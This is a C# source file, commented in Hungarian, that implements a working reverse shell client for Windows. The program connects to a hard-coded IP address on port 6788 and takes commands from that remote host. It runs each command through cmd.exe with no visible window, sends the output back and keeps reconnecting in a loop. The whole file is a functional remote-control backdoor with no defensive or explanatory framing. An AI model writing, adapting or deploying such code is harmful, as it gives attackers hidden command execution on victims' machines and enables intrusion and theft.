using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Threading;
using System.Diagnostics;


namespace rSL
{
    internal class Program
    {
        public static string serverIP = "192.168.9.105";
        static void Main(string[] args)
        {

            //6788



        elorol://megpróbál ujra csatlakozni
            try
            {
                

                TcpClient client = new TcpClient(serverIP, 6788);
                NetworkStream stream = client.GetStream();

                while (true)
                {
                    //Console.WriteLine("breki");
                    byte[] buffer = new byte[1024];
                    int bytes = stream.Read(buffer, 0, buffer.Length);
                    string text = Encoding.UTF8.GetString(buffer, 0, bytes);//itt kapja meg az üzeneteket
                    string command = text;
                    //Console.WriteLine(msg);
                    try
                    {
                        // Parancs
                        

                        // Folyamat beállítása
                        ProcessStartInfo psi = new ProcessStartInfo();
                        psi.FileName = "cmd.exe";
                        psi.Arguments = "/c " + command;  // /c = futtatja, majd bezárja a cmd-t
                        psi.RedirectStandardOutput = true; // ide fogja irányítani a kimenetet
                        psi.RedirectStandardError = true;  // hibaüzeneteket is lekérheted
                        psi.UseShellExecute = false;       // kötelező a redirekcióhoz
                        psi.CreateNoWindow = true;         // ne nyisson új ablakot

                        // Folyamat indítása
                        using (Process process = Process.Start(psi))
                        {
                            // Kimenet beolvasása
                            string output = process.StandardOutput.ReadToEnd();
                            string errors = process.StandardError.ReadToEnd();

                            process.WaitForExit(); // megvárjuk, amíg lefut
                            Console.WriteLine(output);
                            text = output;

                            if (!string.IsNullOrEmpty(errors))
                            {
                                text = errors;
                            }
                        }
                    }
                    catch (Exception)
                    {
                        Console.WriteLine("idk");
                    }
                    Console.ForegroundColor = ConsoleColor.Green;
                    if (command == "cd..")
                    {
                        Directory.SetCurrentDirectory("..");
                    }
                    else if (command.StartsWith("cd"))
                    {
                        string msg = parancsDarabolas(command);
                        if (!string.IsNullOrEmpty(msg))
                        {
                            try
                            {
                                Directory.SetCurrentDirectory(msg);
                            }
                            catch (Exception e)
                            {

                                Console.WriteLine(  e);
                            }
                        }
                    }
                    Console.ForegroundColor = ConsoleColor.Gray;


                    text += $"\n{Directory.GetCurrentDirectory() + ">"}";
                    Send(text, stream);

                    Console.WriteLine(text);



                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
                goto elorol;
            }


        }
        static void Send(string message, NetworkStream stream)
        {
            string targetIp = serverIP;
            byte[] data = Encoding.UTF8.GetBytes(message);
            // Keressük a kliens listában
            Console.WriteLine("ide még eljutott");
            try
            {
                stream.Write(data, 0, data.Length);
                Console.WriteLine($"[{message} elküldve erre : {targetIp}]");
                //Console.ReadKey();
                //Log($"[÷{message}÷ |elküldve erre :| ÷{targetIp}÷]");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[Hiba a küldés során {targetIp}-nek.]");
                //Log($"[$Hiba a küldés során$÷ {targetIp}÷$-nek.$]");
            }

            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("ide is");
            //Console.ReadKey();
        }
        static public string parancsDarabolas(string asd)
        {
            string[] daraboltSzoveg = asd.Split(' ').Skip(1).ToArray();
            string returner = "";
            foreach (string a in daraboltSzoveg)
            {
                returner += a;
                returner += " ";
            }
            if (true)
            {

            }
            if (!string.IsNullOrEmpty(returner)) returner = returner.Remove(returner.Length - 1);

            return returner;
        }

    }
}
